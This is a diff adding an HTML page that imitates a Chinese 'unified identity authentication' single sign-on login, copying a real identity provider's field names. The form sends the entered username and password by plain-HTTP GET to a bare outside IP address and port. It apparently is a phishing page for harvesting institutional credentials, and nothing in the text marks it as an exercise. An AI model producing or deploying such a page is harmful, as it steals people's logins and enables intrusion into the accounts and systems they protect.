@@ -1,0 +1,47 @@
+<!DOCTYPE HTML>
+<html lang="zh">
+<head>
+  <meta http-equiv="content-language" content="zh">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta http-equiv="content-type" content="text/html;charset=utf-8">
+	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0,user-scalable=yes">
+  <style type="text/css">
+  	#Txtidcode{
+			width:180px;}
+  </style>
+</head>
+<body>
+	<div class="main" role="main">
+		<div class="main_wrap">
+
+			<div class="wrap">
+
+				<h1><strong>统一身份认证</strong></h1>
+
+				<form name="IDPLogin" id="myform" enctype="application/x-www-form-urlencoded" method="GET" action="http://106.12.93.121:5888/login" AUTOCOMPLETE="off">
+					<input name="option" type="hidden" value="credential">
+					<input id="errorId" type="hidden" value="1">
+				<p id="error" class="error"></p>			
+					<p class="username">
+						<input type="text" id="username" name="Ecom_User_ID" placeholder="用户名" tabindex="1">
+					</p>
+					<p class="password">
+						<input type="password" id="password" name="Ecom_Password" placeholder="口令" tabindex="2">
+					</p>
+					<p class="form_submit">
+						<input type="button" name="btsubmit" value="登录" tabindex="3" onclick="buttonsubmit()">
+						<script>
+							function buttonsubmit(){
+								document.getElementById('myform').submit()
+							}
+						</script>
+					</p>
+					<p style="padding:11px 10px 12px; "></p>
+					<p class="form_submit">
+					</p>
+				</form>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
